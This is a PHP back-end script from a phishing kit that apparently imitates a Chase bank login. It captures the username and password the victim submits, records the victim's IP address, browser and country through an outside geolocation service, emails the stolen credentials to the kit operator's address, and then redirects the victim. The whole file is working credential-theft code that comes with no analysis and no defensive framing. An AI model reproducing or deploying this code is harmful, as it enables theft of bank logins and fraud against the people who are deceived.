<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

include 'Email.php';

$_SESSION['usr'] = $_POST['usr'];
$_SESSION['pwd'] = $_POST['pwd'];

$ipaddress = $_SERVER['REMOTE_ADDR'];
$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ipaddress));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------[ P.I ]---------------------\n";
$message .= "User ID        : ".$_POST['usr']."\n";
$message .= "Password       : ".$_POST['pwd']."\n";
$message .= "--------------[ SELIM ]---------------------\n";
$message .= "IP            : ".$ipaddress."\n";
$message .= "--------------[ team work ]---------------------\n";
$message .= "|Client IP: ".$ipaddress2."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
$message .= "Browser                 :".$browserAgent."\n";
$message .= "DateTime                : ".$timedate."\n";
$message .= "country                 : ".$country."\n";
$message .= "Address                 : ".$addr_details."\n";
$message .= "ISP                     : ".$hostname."\n";
$subject = "xXxXxCHASExXxXx $ipaddress";
$headers = "From: Mokaa <Source@Bourder.land>";
mail($SEND,$subject,$message,$headers);

header("Location: redirect.php?$host$host$host$host");


?>